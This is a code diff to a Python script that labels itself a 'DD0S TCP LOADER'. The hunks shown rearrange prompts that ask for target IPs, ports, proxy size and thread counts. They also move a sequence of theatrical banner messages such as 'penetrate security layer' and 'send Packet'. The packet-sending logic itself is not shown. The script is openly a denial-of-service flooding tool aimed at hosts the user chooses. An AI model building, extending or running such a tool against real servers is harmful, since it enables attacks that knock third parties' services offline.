@@ -47,23 +47,6 @@ while attemps < 100:
         continue
 os.system("clear")
 
-ip = str(input(" Target IP :"))
-port = int(input(" Target Port :"))
-choice = str(input(" (y/n) :"))
-times = int(input(" Time :"))
-threads = int(input(" Threads :"))
-
-time.sleep(5),
-print("\033[96m                  ⟩⟩  DD0S TCP LOADER \033[0m "),
-time.sleep(5),
-print("\033[92m                  ⟩⟩  search server \033[0m "),
-time.sleep(5),
-print("\033[1m                  ⟩⟩  starts connection \033[0m "),
-time.sleep(5),
-print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
-time.sleep(5),
-print("\033[95m                  ⟩⟩  send Packet \033[0m "),
-time.sleep(5),
 # Date and Time Declaration and Initialization
 mydate = time.strftime('%Y-%m-%d')
 mytime = time.strftime('%H-%M')
@@ -81,11 +64,21 @@ def send_packets(ip, port, data, proxy_size):
                 port = 1
 
 # Type your ip and port number (find IP address using nslookup or any online website)
-ips = input("IP Targets (separated by commas): ").split(',')
-ports = input("Ports (separated by commas): ").split(',')
+ips = input("IP Targets : ").split(',')
+ports = input("Ports : ").split(',')
 proxy_size = int(input("Proxy Size : "))
 threads = int(input("Number of threads : "))
-
+time.sleep(5),
+print("\033[96m                  ⟩⟩  DD0S TCP LOADER \033[0m "),
+time.sleep(5),
+print("\033[92m                  ⟩⟩  search server \033[0m "),
+time.sleep(5),
+print("\033[1m                  ⟩⟩  starts connection \033[0m "),
+time.sleep(5),
+print("\033[97m                  ⟩⟩  penetrate security layer \033[0m "),
+time.sleep(5),
+print("\033[95m                  ⟩⟩  send Packet \033[0m "),
+time.sleep(5),
 
 time.sleep(3)
 for ip in ips:
